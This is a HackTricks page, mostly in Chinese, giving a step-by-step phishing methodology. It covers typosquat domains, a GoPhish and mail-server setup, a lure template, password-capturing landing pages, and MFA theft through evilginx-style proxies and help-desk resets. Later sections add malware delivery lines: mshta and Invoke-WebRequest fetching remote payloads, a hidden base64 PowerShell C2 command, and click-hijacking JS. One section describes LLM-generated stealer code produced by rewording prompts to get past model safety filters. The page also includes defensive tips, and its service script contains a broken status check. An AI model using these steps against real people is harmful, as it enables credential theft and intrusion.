# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 侦察 victim
1. 选择 **victim domain**。
2. 进行一些基本的 web 枚举，**搜索 victim 使用的 login portals**，并**决定**你要**冒充**哪一个。
3. 使用一些 **OSINT** 来**查找 emails**。
2. 准备环境
1. **购买你**将用于 phishing assessment 的 domain
2. **配置 email service** 相关记录（SPF, DMARC, DKIM, rDNS）
3. 在 VPS 上配置 **gophish**
3. 准备 campaign
1. 准备 **email template**
2. 准备用于窃取 credentials 的 **web page**
4. 启动 campaign！

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: 域名**包含**原始 domain 的一个重要 **keyword**（例如，zelster.com-management.com）。
- **hypened subdomain**: 将子域名中的 **点改为连字符**（例如，www-zelster.com）。
- **New TLD**: 使用**新的 TLD** 的相同 domain（例如，zelster.org）
- **Homoglyph**: 用**看起来相似的字母**替换域名中的一个字母（例如，zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 在域名中**交换两个字母**（例如，zelsetr.com）。
- **Singularization/Pluralization**: 在域名末尾添加或删除 “s”（例如，zeltsers.com）。
- **Omission**: 从域名中**删除一个**字母（例如，zelser.com）。
- **Repetition:** 在域名中**重复一个**字母（例如，zeltsser.com）。
- **Replacement**: 类似 homoglyph，但更不隐蔽。它会替换域名中的一个字母，可能替换为键盘上与原字母相邻的字母（例如，zektser.com）。
- **Subdomained**: 在域名中间引入一个 **点**（例如，ze.lster.com）。
- **Insertion**: 向域名中**插入一个字母**（例如，zerltser.com）。
- **Missing dot**: 将 TLD 追加到域名后面。（例如，zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

有一种**可能性**，由于太阳耀斑、宇宙射线或硬件错误等各种因素，存储或通信中的某些 bit 可能会被自动翻转。

当这个概念**应用于 DNS requests** 时，DNS server 接收到的**域名**可能与最初请求的域名不同。

例如，对域名 "windows.com" 的单个 bit 修改可以将其变为 "windnws.com."

攻击者可能**利用这一点注册多个 bit-flipping 域名**，使其与 victim 的域名相似。他们的意图是将合法用户重定向到自己的基础设施。

更多信息请阅读 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

你可以在 [https://www.expireddomains.net/](https://www.expireddomains.net) 搜索一个你可以使用的 expired domain。\
为了确保你将要购买的 expired domain **已经有较好的 SEO**，你可以查看它在以下位置是如何分类的：

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

为了**发现更多**有效 email 地址，或者**验证你**已经发现的地址，你可以检查是否能够对 victim 的 smtp servers 进行 brute-force。 [在这里了解如何验证/发现 email address](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
此外，不要忘记，如果用户使用**任何 web portal 来访问他们的 mails**，你可以检查它是否存在 **username brute force** 漏洞，并在可能时利用该漏洞。

## Configuring GoPhish

### Installation

你可以从 [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) 下载它

将其下载并解压到 `/opt/gophish` 中，然后执行 `/opt/gophish/gophish`\
输出中会给你一个用于 3333 端口 admin user 的 password。因此，访问该端口并使用这些凭据来更改 admin password。你可能需要将该端口隧道转发到 local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 配置

**TLS certificate configuration**

在这一步之前，你应该已经**购买了**你将要使用的**domain**，并且它必须已经**指向**你正在配置 **gophish** 的 **VPS 的 IP**。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

停止 gophish 的执行并开始配置它。\
将 `/opt/gophish/config.json` 修改为以下内容（注意使用 https）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**配置 gophish service**

为了创建 gophish service 以便它可以自动启动并作为 service 管理，你可以创建文件 `/etc/init.d/gophish`，内容如下：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
完成服务配置并检查它，可执行：
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 配置 mail server 和 domain

### Wait & be legit

domain 越老，越不容易被判定为 spam。然后你应该在 phishing assessment 之前尽可能等待更长时间（至少 1week）。此外，如果你放一个关于 reputational sector 的页面，获得的 reputation 会更好。

注意，即使你必须等一周，你现在也可以把所有配置都完成。

### Configure Reverse DNS (rDNS) record

设置一个 rDNS (PTR) record，将 VPS 的 IP address 解析到 domain name。

### Sender Policy Framework (SPF) Record

你必须为新的 domain **configure a SPF record**。如果你不知道什么是 SPF record，请[**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 来生成你的 SPF policy（使用 VPS machine 的 IP）

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

这是必须设置在 domain 内部的 TXT record 内容：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) 记录

你必须**为新域名配置一个 DMARC 记录**。如果你不知道什么是 DMARC 记录， [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

你需要创建一个新的 DNS TXT 记录，指向主机名 `_dmarc.<domain>`，其内容如下：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

你必须为新域名**配置 DKIM**。如果你不知道什么是 DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

本教程基于: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> 你需要把 DKIM key 生成的两个 B64 values 拼接起来:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 测试你的 email configuration score

你可以使用 [https://www.mail-tester.com/](https://www.mail-tester.com)\
只需访问该页面并向他们提供的地址发送一封 email:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
你也可以通过向 `check-auth@verifier.port25.com` 发送一封邮件并**阅读回复**来**检查你的邮件配置**（为此你需要**打开**端口 **25**，如果你以 root 身份发送邮件，就在文件 _/var/mail/root_ 中查看响应）。\
检查你是否通过了所有测试：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
你也可以向你控制的 **Gmail** 发送 **message**，然后检查你 Gmail 收件箱中的 **email’s headers**，在 `Authentication-Results` header field 中应当存在 `dkim=pass`。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) 可以告诉你你的域是否被 spamhouse 屏蔽。你可以在这里请求将你的域/IP 移除：[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​你可以在 [https://sender.office.com/](https://sender.office.com) 请求将你的域/IP 移除。

## Create & Launch GoPhish Campaign

### Sending Profile

- Set some **name to identify** the sender profile
- Decide from which account are you going to send the phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
- You can leave blank the username and password, but make sure to check the Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 建议使用 "**Send Test Email**" 功能来测试一切是否正常。\
> 我建议将测试邮件发送到 10min mails 地址，以避免在测试时被拉入黑名单。

### Email Template

- Set some **name to identify** the template
- Then write a **subject** (nothing estrange, just something you could expect to read in a regular email)
- Make sure you have checked "**Add Tracking Image**"
- Write the **email template** (you can use variables like in the following example):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
注意，**为了提高邮件的可信度**，建议使用来自客户邮箱中的某个签名。建议：

- 向一个**不存在的地址**发送一封邮件，并检查响应中是否有任何签名。
- 搜索诸如 info@ex.com、press@ex.com 或 public@ex.com 之类的**公开邮箱**，给它们发送邮件并等待响应。
- 尝试联系某个已发现的**有效**邮箱并等待响应

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template 还允许**附加要发送的文件**。如果你还想使用一些特制文件/文档来窃取 NTLM challenge，请[阅读此页面](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 写一个**名称**
- **编写网页的 HTML 代码**。注意，你可以**导入**网页。
- 勾选 **Capture Submitted Data** 和 **Capture Passwords**
- 设置一个**重定向**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 通常你需要修改页面的 HTML 代码，并在本地进行一些测试（也许使用某个 Apache server）**直到你满意结果为止。**然后，把那段 HTML 代码写到框里。\
> 注意，如果你需要为 HTML **使用静态资源**（也许是一些 CSS 和 JS 页面），你可以把它们保存在 _**/opt/gophish/static/endpoint**_ 中，然后通过 _**/static/\<filename>**_ 访问它们。

> [!TIP]
> 对于重定向，你可以**把用户重定向到受害者合法的主网页**，或者重定向到 _/static/migration.html_，例如，放一个**转圈加载动画（**[**https://loading.io/**](https://loading.io)**）持续 5 秒，然后提示过程成功**。

### Users & Groups

- 设置一个名称
- **导入数据**（注意，为了在示例中使用模板，你需要每个用户的 firstname、last name 和 email address）

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

最后，创建一个 campaign，选择名称、email template、landing page、URL、sending profile 和 group。注意，URL 将是发送给受害者的链接

注意，**Sending Profile 允许发送测试邮件，以查看最终的 phishing email 看起来是什么样**：

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> 我建议将测试邮件发送到 10min mails 地址，以避免在测试时被列入黑名单。

一切准备好后，直接启动 campaign！

## Website Cloning

如果出于任何原因你想克隆该网站，请查看以下页面：


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

在某些 phishing 评估中（主要是 Red Teams），你还会想要**发送包含某种 backdoor 的文件**（也许是 C2，或者只是会触发认证的东西）。\
查看以下页面获取一些示例：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前面的攻击相当巧妙，因为你伪造了一个真实网站并收集用户填写的信息。不幸的是，如果用户没有输入正确的密码，或者你伪造的应用配置了 2FA，**这些信息将无法让你冒充被欺骗的用户**。

这就是 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) 和 [**muraena**](https://github.com/muraenateam/muraena) 这类工具有用的地方。这个工具可以让你生成类似 MitM 的攻击。基本上，攻击过程如下：

1. 你**伪装登录**真实网页的表单。
2. 用户把他的**凭据**发送到你的假页面，而工具会把这些内容发送到真实网页，**检查凭据是否有效**。
3. 如果账户配置了 **2FA**，MitM 页面会要求输入它；一旦**用户输入**，工具就会把它发送到真实网页。
4. 一旦用户完成认证，你（作为攻击者）将会在工具执行 MitM 的同时，**捕获凭据、2FA、cookie 以及每次交互中的任何信息**。

### Via VNC

如果不是把受害者**发送到一个与原始页面外观相同的恶意页面**，而是把他送到一个**VNC session，其中有一个浏览器连接到真实网页**，会怎样？你将能够看到他做了什么、窃取密码、使用的 MFA、cookie……\
你可以使用 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) 来实现。

## Detecting the detection

显然，判断自己是否已经暴露的最佳方式之一，就是**在黑名单中搜索你的 domain**。如果它出现在列表中，说明你的 domain 在某种程度上被识别为可疑。\
检查你的 domain 是否出现在任何黑名单中的一个简单方法是使用 [https://malwareworld.com/](https://malwareworld.com)

不过，还有其他方法可以判断受害者是否在**主动在野外寻找可疑的 phishing 活动**，如下所述：


{{#ref}}
detecting-phising.md
{{#endref}}

你可以**购买一个与受害者 domain 非常相似的 domain**，**和/或为你控制的某个 domain 的一个 subdomain 生成证书**，该 subdomain **包含**受害者 domain 的**关键词**。如果**受害者**对它们进行任何形式的 **DNS 或 HTTP 交互**，你就会知道他正在**主动寻找**可疑 domain，你需要非常隐蔽。

### Evaluate the phishing

使用 [**Phishious** ](https://github.com/Rices/Phishious)来评估你的邮件是会进垃圾箱、会被阻止，还是会成功。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

现代 intrusion set 越来越少完全依赖邮件诱饵，而是**直接针对 service-desk / identity-recovery 工作流**来绕过 MFA。这个攻击完全是“living-off-the-land”：一旦操作者拿到有效凭据，就通过内置管理工具进行横向推进——不需要 malware。

### Attack flow
1. Recon 受害者
* 从 LinkedIn、数据泄露、公开 GitHub 等渠道收集个人与公司信息。
* 识别高价值身份（高管、IT、财务），并枚举用于密码 / MFA reset 的**准确 help-desk 流程**。
2. Real-time social engineering
* 通过电话、Teams 或 chat 联系 help-desk，并冒充目标对象（通常配合**伪造 caller-ID**或**克隆声音**）。
* 提供之前收集的 PII，通过基于知识的验证。
* 说服客服人员**重置 MFA secret**，或者对已注册手机号执行 **SIM-swap**。
3. Immediate post-access actions (≤60 min in real cases)
* 通过任意 web SSO portal 建立 foothold。
* 使用内置工具枚举 AD / AzureAD（不落地 binary）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 使用环境中已被加入白名单的 **WMI**、**PsExec** 或合法 **RMM** agent 进行 lateral movement。

### Detection & Mitigation
* 将 help-desk identity recovery 视为**特权操作**——要求 step-up auth 和经理批准。
* 部署 **Identity Threat Detection & Response (ITDR)** / **UEBA** 规则，告警如下情况：
* MFA method changed + 来自新设备 / 新地理位置的 authentication。
* 同一主体立即提升权限（user→admin）。
* 记录 help-desk 通话，并在任何 reset 之前强制对**已注册号码回拨**。
* 实施 **Just-In-Time (JIT) / Privileged Access**，使新重置的账户**不会**自动继承高权限 token。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
商品化团伙通过大规模攻击来抵消高接触操作的成本，这些攻击把**search engines & ad networks 当作投递渠道**。

1. **SEO poisoning / malvertising** 将 `chromium-update[.]site` 之类的假结果推到搜索广告前列。
2. 受害者下载一个小型**first-stage loader**（通常是 JS/HTA/ISO）。Unit 42 看到的示例包括：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader 先外传 browser cookies + credential DBs，然后再拉取一个 **silent loader**，它会**实时**决定是否部署：
* RAT（例如 AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* 阻止 newly-registered domains，并对 *search-ads* 以及 e-mail 强制启用 **Advanced DNS / URL Filtering**。
* 通过策略限制软件安装，只允许签名 MSI / Store packages，禁止执行 `HTA`、`ISO`、`VBS`。
* 监控浏览器启动安装程序的子进程：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* 搜索经常被 first-stage loaders 滥用的 LOLBins（例如 `regsvr32`、`curl`、`mshta`）。

### Download-button click hijacking with TDS handoff
一些假 software portals 会把可见的下载 `href` 指向**真实**的 GitHub/release URL，但在 JavaScript 中劫持**第一次**用户交互，并把受害者转入一个 **Traffic Distribution System (TDS)** 链。
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- 该 hook 通常在 `document` 上以 **capture phase** (`true`) 运行，因此会在站点 handler 之前触发。
- Chrome 常使用 `mousedown` 而不是 `click`，以便让重定向绑定到有效的 **user gesture**，并提升对 popup-blocker 的绕过效果。
- 某些变体会先打开 `about:blank` 或模拟 `<a target="_blank">` 点击，然后才分配 TDS URL。
- 浏览器侧的上限通常存放在 `localStorage` 中，所以 **first click** 可能会把用户带到 malware，而刷新/重试则回退到看起来无害的可见链接。
- TDS 可以按 referrer、entry domain、GEO、browser/device fingerprint、VPN/datacenter 检查、click context 以及每个 session 的计数器进行分流，这会让 analyst 的重放结果变得非确定性。

Defender ideas:
- 比较显示的 `href` 与 click 时实际生成的导航目标。
- 搜索 `document.addEventListener(..., true)` 的 handler，这些 handler 会在 `window.open`、`about:blank` 或 synthetic anchor clicks 周围同时调用 `preventDefault()` 和 `stopImmediatePropagation()`。
- 将一组新注册的 software-download 域名、且都加载相同 CloudFront/JS stage 的情况，视为高信号的 SEO-poisoning/TDS 模式。

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
某些 TDS 分支最终会进入一个 fake verification page（Cloudflare/IUAM 风格），提示受害者运行一个可信的 Windows binary，例如：
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
注：
- `mshta.exe` 会在响应开始时执行 **HTA/VBScript**，即使 URL 伪装成 `.7z` 压缩包；附加的归档数据可以只是纯诱饵。
- 后续阶段通常会继续伪装文件类型（`.rtf` 用于 PowerShell，`.asar` 用于 Python，带填充二进制的 ZIP），然后切换到 **manual PE mapping / in-memory execution**。
- 如果你正在响应这类链路，请保留第一次成功运行时的 **network + memory**：后续重放可能只会显示无害的 installer/SFX 路径，或者因为 payload/key 绑定到了原始 TDS session 而失败。

### ClickFix DLL delivery tradecraft (fake CERT update)
* 诱饵：仿冒的国家 CERT 通告，带一个 **Update** 按钮，显示逐步“修复”说明。受害者被要求运行一个 batch，下载 DLL 并通过 `rundll32` 执行。
* 常见的 batch 链如下：
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` 将 payload 丢到 `%TEMP%`，短暂 sleep 用来掩盖 network jitter，然后 `rundll32` 调用导出入口点（`notepad`）。
* 该 DLL 会回连 host identity，并每隔几分钟轮询 C2。远程任务以 **base64-encoded PowerShell** 形式下发，隐藏执行并绕过 policy：
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 这既保留了 C2 的灵活性（服务器可以在不更新 DLL 的情况下切换任务），又隐藏了 console 窗口。要重点排查 `rundll32.exe` 的子进程中同时出现 `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` 的 PowerShell。
* 防守方可以寻找形如 `...page.php?tynor=<COMPUTER>sss<USER>` 的 HTTP(S) callback，以及 DLL 加载后的 5 分钟轮询间隔。

---

## AI-Enhanced Phishing Operations
攻击者现在会串联 **LLM 和 voice-clone APIs**，实现高度个性化的诱饵和实时交互。

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|生成并发送超过 100k 封 email / SMS，使用随机化措辞和 tracking links。|
|Generative AI|生成一次性邮件，引用公开 M&A、社交媒体上的内部笑话；在 callback scam 中伪造 CEO 声音。|
|Agentic AI|自主注册域名、抓取开源情报、在受害者点击但未提交凭据时自动撰写下一阶段邮件。|

**Defence:**
• 添加 **dynamic banners**，突出显示来自不受信任自动化的消息（通过 ARC/DKIM anomalies 识别）。  
• 为高风险电话请求部署 **voice-biometric challenge phrases**。  
• 在 awareness programmes 中持续模拟 AI 生成的诱饵——静态模板已经过时。

另见 – 用于 credential phishing 的 agentic browsing abuse：

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

另见 – AI agent abuse of local CLI tools and MCP（用于 secrets inventory 和 detection）：

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻击者可以投递看起来无害的 HTML，并通过向一个 **trusted LLM API** 请求 JavaScript，在运行时 **generate stealer**，然后在浏览器内执行它（例如，`eval` 或动态 `<script>`）。

1. **Prompt-as-obfuscation:** 在 prompt 中编码 exfil URLs/Base64 字符串；反复调整措辞以绕过 safety filters 并减少 hallucinations。
2. **Client-side API call:** 页面加载时，JS 调用公共 LLM（Gemini/DeepSeek/etc.）或 CDN proxy；静态 HTML 中只存在 prompt/API 调用。
3. **Assemble & exec:** 将响应拼接后执行（每次访问都可能不同）：
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
监控 AzureAD/AWS/Okta 事件，其中 **`deleteMFA` + `addMFA`** 在**几分钟内**且来自**同一 IP**发生。



## Clipboard Hijacking / Pastejacking

攻击者可以从被入侵或拼写域劫持的网页中，悄悄将恶意命令复制到受害者的剪贴板，然后诱导用户在 **Win + R**、**Win + X** 或终端窗口中粘贴，从而在无需下载或附件的情况下执行任意代码。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* 一个诱饵页面（例如伪造的 ministry/CERT “channel”）显示 WhatsApp Web/Desktop 的 QR，并指示受害者扫描，从而静默将攻击者添加为 **linked device**。
* 攻击者会立即获得聊天/联系人可见性，直到该会话被移除。受害者之后可能会看到“new device linked”通知；防御者可以在访问不受信任的 QR 页面后不久，搜寻意外的 device-link 事件。

### Mobile‑gated phishing to evade crawlers/sandboxes
攻击者越来越多地在其 phishing 流程前加一个简单的设备检查，让桌面爬虫永远到不了最终页面。常见模式是一个小脚本，用于测试是否存在支持触控的 DOM，并将结果发送到服务器端点；非移动端客户端会收到 HTTP 500（或空白页），而移动端用户则会看到完整流程。

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 逻辑（简化版）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server 行为常见表现：
- 在首次加载时设置 session cookie。
- 接受 `POST /detect {"is_mobile":true|false}`。
- 当 `is_mobile=false` 时，后续 GET 返回 500（或占位内容）；仅在 `true` 时提供 phishing 内容。

检测与狩猎启发：
- urlscan 查询：`filename:"detect_device.js" AND page.status:500`
- Web telemetry：`GET /static/detect_device.js` → `POST /detect` → 对非 mobile 返回 HTTP 500；合法的 mobile 受害者路径返回 200，并继续加载 HTML/JS。
- 阻止或重点审查那些仅基于 `ontouchstart` 或类似 device checks 来决定内容的页面。

防御提示：
- 使用 mobile-like 指纹并启用 JS 运行爬虫，以揭示被门控的内容。
- 对新注册域名上在 `POST /detect` 之后出现的可疑 500 响应进行告警。

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
